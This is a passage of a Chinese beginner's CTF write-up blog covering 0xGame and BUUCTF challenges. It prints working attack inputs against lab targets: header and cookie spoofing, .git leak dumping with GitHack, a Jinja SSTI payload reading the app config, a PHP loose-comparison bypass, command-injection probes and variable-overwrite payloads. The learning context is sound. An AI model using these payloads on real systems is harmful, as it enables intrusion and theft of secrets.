class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag = 0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;</code></p><h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>第一关提示用<code>Get</code>方式传<code>query</code>，而且值必须是<code>ctf</code></p><p><code>?query=ctf</code></p><p>第二关提示用<code>POS</code>T传<code>action</code>,而且值必须是<code>getflag</code></p><p><code>action=getflag</code></p><p>第三关提示 <code>you are not admin</code>，想到这东西可能在cookie放着，burpsuite抓包：发现<code>Cookie: role=guest</code>，改成<code>Cookie: role=admin</code></p><p>第四关提示<code>Error: Only allow local IP</code>，还是抓包加个XFF头：</p><p><code>X-Forwarded-For:127.0.0.1</code></p><p>第五关提示<code>Error: You are not using HarmonyOS Browser 😡</code>，还是抓包改User-Agent：</p><p><code>User-Agent:HarmonyOS Browser</code></p><p>第六关提示必须来自<code>ys.mihoyo.com</code>，抓包改Referer：</p><p><code>Referer: ys.mihoyo.com</code></p><p>得到Flag:<code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;</code></p><h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>进环境后发现是个博客主页，里面有个Notice博文写了这么个东西：</p><p><code>There is noting here. Using Git for version control</code></p><p>结合题目想到可能是敏感信息泄露，而且访问<code>/.git</code>并没有弹404</p><p>用dirsearch扫了一下，发现大量.git文件，猜测git泄露：</p><p><img src="/img/repo1.png" alt="repo1"></p><p>GitHack弄它：</p><p><code>python2 GitHack.py http://120.27.148.152:50013/.git</code></p><p><img src="/img/repo2.png" alt="repo2"></p><p>在存储扫描结果的文件夹利用<code>git log</code>查看每个commit都干了啥：</p><p><img src="/img/rerpo3.png" alt="rerpo3"></p><p>看到了三个版本，发现有个 <code>add post : flag</code></p><p>对比下版本拿flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git diff ea44cb8ff3c27bb1db6d3acc4c875144d295045d 8a5b670558921bd232d75b29542492f00698298b<br></code></pre></td></tr></table></figure><p><img src="/img/repo4.png" alt="repo4"></p><p><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;</code></p><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>明明是签到却是最后一个解出来的:(运气好被我乱点点出来了</p><p><img src="/img/ok1.png" alt="ok1"></p><p><code>flag：0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;</code></p><h1 id="MISC部分"><a href="#MISC部分" class="headerlink" title="MISC部分"></a>MISC部分</h1><h3 id="Week-1-shark-shark"><a href="#Week-1-shark-shark" class="headerlink" title="[Week 1] shark shark"></a>[Week 1] shark shark</h3><p>第一次做杂项的题 :) 下载附件后用wireshark打开，发现好像是个登录过程？登录后执行了一些命令 ：</p><p><img src="/img/shark.png" alt="shark"></p><p>直接搜<code>0xGame</code>和<code>flag</code>都没结果。。但在返回包里有这么个东西？</p><p><img src="/img/shark2.png" alt="shark2"></p><p>把data拿出来拿去问了CHATGPT:)说这是一个ZIP文件的十六进制表示，要把它解码成二进制数据再解压。发现有个<code>flag.txt</code>文件，但需要密码：</p><p><img src="/img/shark3.png" alt="shark3"></p><p>想到刚才追踪流的时候有个very_safe_password，尝试了一下得到了flag：<code>0xGame&#123;7a504dab-ada6-4c41-adb3-0d1530098cd4&#125;</code></p><h3 id="Week-1-hide-and-seek"><a href="#Week-1-hide-and-seek" class="headerlink" title="[Week 1] hide and seek"></a>[Week 1] hide and seek</h3><p>根据题目提示和师傅在群里的提示，下载了<code>stegseek</code>这个工具，弄一下就得到flag了：</p><p><img src="/img/hiideandseek.png" alt="hiideandseek"></p><h3 id="Week-1-least-and-most"><a href="#Week-1-least-and-most" class="headerlink" title="[Week 1] least and most"></a>[Week 1] least and most</h3><p>题目提示是隐写，网上下了个叫<code>stegsolve</code>的工具，一通乱点得到了：</p><p><code>0xGame&#123;l sb_com</code>和<code>bined_wi th_msb&#125;</code>。</p><h3 id="Week-1-signin-1"><a href="#Week-1-signin-1" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p><code>R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=</code></p><p>看着像base64，先解码看看啥情况：</p><p><code>GB4EOYLNMV5VOZLMMMYG2ZK7KRXV6MDYI5QW2ZJSGAZDGIJBPU======</code></p><p>再用base32解一下：</p><p><code>0xGame&#123;Welc0me_To_0xGame2023!!&#125;</code></p><h3 id="Week-1-重生之我在教学楼打cs"><a href="#Week-1-重生之我在教学楼打cs" class="headerlink" title="[Week 1] 重生之我在教学楼打cs"></a>[Week 1] 重生之我在教学楼打cs</h3><p>下载发现是个bsp文件，根据师傅的提示发现这东西是个cs1.6的地图文件，重命名一下放到<code>cstrike</code>下的<code>maps</code>文件夹里，然后cs1.6直接进地图。在鼎右下角找到了一串小字：</p><p><code>0xGame&#123;CS_very_good&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="Week-1-找不到且不对劲的flag"><a href="#Week-1-找不到且不对劲的flag" class="headerlink" title="[Week 1] 找不到且不对劲的flag"></a>[Week 1] 找不到且不对劲的flag</h3><p><code> nc 8.130.35.16 51000</code>后<code>ls</code>,发现有个<code>flag</code>但<code>cat</code>读了发现是假的:</p><p><img src="/img/secret.png" alt="secret"></p><p><code>ls -al</code>发现有个<code>.secret</code>文件，<code>cat</code>读了下得到了<code>flag</code></p><p><img src="/img/pwn1.png" alt="pwn1"></p><h1 id="Crypto部分"><a href="#Crypto部分" class="headerlink" title="Crypto部分"></a>Crypto部分</h1><h3 id="Week-1-Vigenere"><a href="#Week-1-Vigenere" class="headerlink" title="[Week 1] Vigenere"></a>[Week 1] Vigenere</h3><p>题目描述：密文：0dGmqk{79ap4i0522g0a67m6i196he52357q60f} 古老而神秘的加密方式？</p><p><code>flag</code>格式<code>0xGame&#123;xxxx&#125;</code>，现在开头是<code>0dGmqk</code>，猜测密钥前四位是<code>game</code>?，先在线解密看下结果：</p><p><img src="/img/vig.png" alt="vig"></p><p>得到flag。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF做题记录_1</title>
    <link href="/2023/09/17/helloworld/"/>
    <url>/2023/09/17/helloworld/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a><strong>shrine</strong></h2><p>进去直接给了一大坨代码，简单捋一下：<br><img src="/img/c1.png" alt="c1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#将FLAG从环境变量中弹出去，弹出去的FLAG给了app.config字典中FLAG键对应的值，可以用config[&#x27;FLAG&#x27;]访问它，但后面会把config这东西当黑名单过滤掉。</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>       s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#左括号替换为空，右括号替换为空</span><br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<span class="hljs-comment">#把黑名单里的字符全替换为空，两个%用来转义，否则&#123;&#125;就被当成占位符了。注意这个只替换双括号里的config和self，单个括号没啥影响。</span><br><br>  <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>猜测SSTI模板注入，在&#x2F;shrine&#x2F;下尝试49:<br><img src="/img/c2.png" alt="c2"><br>七个七，而且代码里都提了Jinja。<br>对于输入首先过滤了()，然后过滤了config和self这两个关键字。<br>利用<code>/shrine/&#123;&#123;"".__class__.__base__.__base__&#125;&#125;</code>找到了它最大的爹<code>object</code>，再用subclasses找它下面的所有子类：<br><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()&#125;&#125;</code><br><img src="/img/c3.png" alt="c3"><br>出了个这种东西就不会做了。感觉自己的知识还是太贫瘠了，一看到SSTI的题就想着判断类型然后找它的爹执行命令，都快成思维定式了。。。而且做题也不细心，既然它把config和self放到了黑名单里，那为什么偏偏放它俩呢？config可能是因为把FLAG直接弹给了它所以过滤，那self为什么过滤？希望以后在学习过程中能克服这些问题。<br>去网上找了下wp看看其它师傅是怎么解的，感谢这位师傅：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Cl0ud/</span>p/<span class="hljs-number">12316287</span>.html<br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">93746437</span><br></code></pre></td></tr></table></figure><p>如果没有黑名单的化，直接即可访问环境变量中的FLAG，或者用self.<strong>dict</strong> 访问但config和self被黑名单过滤掉了。这时可以使用python内置函数：<code>url_for或者get_flashed_messages</code>读取全局变量<code>current_app</code>。再利用这个<code>current_app</code>访问config字典中FLAG键对应的值。</p><p>payload:<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a><strong>lottery</strong></h3><p>进环境发现是个类似猜骰子的东西：注册账号后去花钱猜数，猜对了给钱。当口袋饱饱之后可以买FLAG：</p><p><img src="/img/lo1.png" alt="lo1"></p><p>题目给了个附件，看看都有啥东西：</p><p><img src="/img/lo2.png" alt="lo2"></p><p>直接把所有代码都给了？和钱有关的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$money</span> = <span class="hljs-string">&#x27;$&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>]; <span class="hljs-comment">//money在SESSION变量中？直接burpsuite抓包看看能不能改</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;li&gt;Username: <span class="hljs-subst">$name</span>&lt;/li&gt;</span><br><span class="hljs-string">&lt;li&gt;Money: <span class="hljs-subst">$money</span>&lt;/li&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//acount.php</span><br></code></pre></td></tr></table></figure><p>直接去buy界面猜数抓包看看啥情况：</p><p><img src="/img/lo3.png" alt="lo3"></p><p>POST传了<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;7777777&quot;&#125;</code>，<code>action:buy</code>，<code>numbers</code>后面是我们猜的数字，系统会把数字带进去和<code>&quot;win_numbers&quot;:&quot;8701664&quot;</code>比较，这个<code>win_numbers</code>和比较对错是怎么定义的？找找有没有相关的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">require_registered</span>();<br><span class="hljs-title function_ invoke__">require_min_money</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];<br><span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];<br><span class="hljs-variable">$win_numbers</span> = <span class="hljs-title function_ invoke__">random_win_nums</span>(); <span class="hljs-comment">//后面那个是生成的七位随机数</span><br><span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//挺常见的弱相等，若对Numbers无过滤则直接输入布尔True让它和任何非零数字相等</span><br><span class="hljs-variable">$same_count</span>++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;   <span class="hljs-comment">//两个及以上相同才会给钱</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">300</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">1800</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">200000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5000000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;  <span class="hljs-comment">//每次尝试需要两块钱</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;<br><span class="hljs-title function_ invoke__">response</span>([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP的弱相等(&#x3D;&#x3D;)和强相等(&#x3D;&#x3D;&#x3D;)碰见挺多次了，弱相等会在比较之前进行类型转换，转换完了再比较是否相等(可以用布尔、科学计数法等绕过)。强相等会直接比较类型是否相等？内容是否相等?(不过依然可以通过数组方法绕过)。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">下面的总结参考了这位师傅的文章:https://blog.csdn.net/qq_43715020?<span class="hljs-keyword">type</span>=blog <br><br>在php中,如果<span class="hljs-type">bool</span>和&quot;任何其他类型&quot;比较,&quot;任何其他类型&quot;会转换为<span class="hljs-type">bool</span>。<br>在PHP中当转换为 <span class="hljs-type">boolean</span> 时，以下值被认为是 <span class="hljs-keyword">FALSE</span> ：<br>(<span class="hljs-number">1</span>) 布尔值 <span class="hljs-keyword">FALSE</span> 本身<br>(<span class="hljs-number">2</span>) 整型值 <span class="hljs-number">0</span>（零）<br>(<span class="hljs-number">3</span>)浮点型值 <span class="hljs-number">0.0</span>（零）<br>(<span class="hljs-number">4</span>)空字符串，以及字符串 “<span class="hljs-number">0</span>”<br>(<span class="hljs-number">5</span>)不包括任何元素的数组(注意,一旦包含元素,就算包含的元素只是一个空数组,也是<span class="hljs-keyword">true</span>)<br>(<span class="hljs-number">6</span>)不包括任何成员变量的对象（仅 PHP <span class="hljs-number">4.0</span> 适用）<br>(<span class="hljs-number">7</span>)特殊类型 <span class="hljs-keyword">NULL</span>（包括尚未赋值的变量）<br>(<span class="hljs-number">8</span>)从空标记生成的 SimpleXML 对象<br>(<span class="hljs-number">9</span>)所有其它值包括<span class="hljs-number">-1</span>都被认为是 <span class="hljs-keyword">TRUE</span> <br></code></pre></td></tr></table></figure><p>因为是拿数组元素一个一个的比较，那就直接让<code>&quot;numbers&quot;</code>为[true,true,true,true,true,true,true]。</p><p>payload:<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</code></p><p><img src="/img/lo4.png" alt="lo4"></p><p>不过有个问题我还没搞懂：bool的true和false常量是不区分大小写的，但我改成：<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[TRUE,TRUE,TRUE,TRUE,TRUE,TRUE,TRUE]&#125;</code>就给我回显invalid json。。。难道json这东西的一些定义还对大小写有说法？</p><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>题目描述: 抓住那只猫</p><p><img src="/img/cat1.png" alt="cat1"></p><p>随便输了个loli.club没啥反应，单上面的URL变化了：</p><p><code>/index.php?url=loli.club</code></p><p>GET传参url?看着像存在文件包含漏洞：</p><p>url&#x3D;etc&#x2F;passwd试了半天没啥反应。。用burpsuite抓包看response有个CAT？输个CAT尝试一下：</p><p><img src="/img/cat2.png" alt="cat2"></p><p>执行了ping命令？试试127.0.0.1：</p><p><img src="/img/cat3.png" alt="cat3"></p><p>果然是ping命令，那这题可能是RCE，但&amp;|;均被过滤掉了(提示invalid URL)。。后面不会做了，下面部分内容参考了这位师傅的博客，感谢：<code>https://blog.csdn.net/qq_44065556/article/details/120541298和https://www.cnblogs.com/xyongsec/p/11364520.html</code></p><p>既然有过滤就要看看它过滤了啥没过滤了啥，在框里输入东西后上面的URL会变化：</p><p><code>http://61.147.171.105:53337/index.php?url=127.0.0.1%26ls</code></p><p>直接送到burpsuite里爆破，集束炸弹模式从<code>%00</code>爆到<code>%FF</code>，发现当URL大于%80后会有报错：</p><p><img src="/img/cat4.png" alt="cat4"></p><p><img src="/img/cat5.png" alt="cat5"></p><p>发现有<html>，<head>等标签猜测要改成html后缀？改完后打开：</p><p><img src="/img/cat6.png" alt="cat6"></p><p>这玩意儿是个<code>Django</code>报错界面(感觉有点像今年NSCTF那道题的报错界面)：</p><p><code>illegal multibyte sequence 意思是非法的多字节序列</code></p><p>而GBK这东西面对超过0x7F的时候会用两个字符表示。感觉就是这里出了问题：超过%7F的URL均会把报错。</p><p>而且当 <code>CURLOPT_SAFE_UPLOAD</code> 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。</p><p><img src="/img/cat7.png" alt="cat7"></p><p>接下来有两种方法：一种先找settings.py在找database，另一种直接在报错页面ctrl+f找database:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure><p>django项目生成时settings.py会存放在项目目录下再以项目名称命名的文件夹下面:</p><p><code>/opt/api/api/settings.py</code></p><p>进数据库里直接ctrl+F然后找CTF就好了。。不过我做这道题的时候不知道咋回事没法读，一直进的是那页报错信息。。。MD</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>进环境发现是个网页：</p><p><img src="/img/a4.png" alt="a4"></p><p>感觉像是敏感文件泄露的题？先试试&#x2F;.git再用dirsearch扫：</p><p><img src="/img/a5.png" alt="a5"></p><p>有东西，直接上Githack：</p><p><code>python GitHack.py http://af058f36-8fc4-47ff-86be-d9b094d1187b.node4.buuoj.cn/.git/</code></p><p>发现有<code>index.php</code>和<code>flag.php</code>：</p><p><img src="/img/a6.png" alt="a6"></p><p>这里碰了钉子：有时候Githack不知道是扫太快了还是咋回事，无法下载扫出来的文件(比如一开始我就找不到下载的flag.php和index.php)。后来在网上找了半天，大佬说是线程太多的原因，把线程改小就可以不被拒绝访问，方法：</p><p><img src="/img/a7.png" alt="a7"></p><p>这东西本来是10，给改成1就好了。</p><p>(我感觉是我用windows的原因。。？因为之前dirsearch也出现过这种情况，用Linux就正常了)</p><p><img src="/img/a8.png" alt="a8"></p><p>看看他俩有啥东西：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs PHP">index.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  POST传x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;  <span class="hljs-comment">//变量覆盖,变量(x的值)=y</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123; GET传x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>; <span class="hljs-comment">//同上，变量(x的值)=变量(y的值)</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  <span class="hljs-comment">//遍历GET传的</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);  <span class="hljs-comment">//终止脚本执行并返回$handsome</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<span class="hljs-comment">//GET、POST均没传flag</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);  <span class="hljs-comment">//终止脚本执行并返回$yds</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>); <span class="hljs-comment">//终止脚本执行并返回$is</span><br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br><br>flag.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$flag已经定义，要想办法把$flag搞出来。但通篇只有利用exit去显示$yds、$is、$handsome，和变量覆盖联系一下：是否可以利用变量覆盖直接exit($flag)？</p><p>第二个flag在我看来最好满足：只要GETPOST都不传flag就行了，但是如何exit($flag)？</p><p><code>$yds=$flag</code>  $(x的值)&#x3D;$(y的值)-&gt;GET传<code>yds=flag</code></p><p>payload：<code>/index.php?yds=flag</code></p><h2 id="BUUCTF-2018-Online-Tool-还没做完标记一下"><a href="#BUUCTF-2018-Online-Tool-还没做完标记一下" class="headerlink" title="[BUUCTF 2018]Online Tool 还没做完标记一下"></a>[BUUCTF 2018]Online Tool 还没做完标记一下</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span 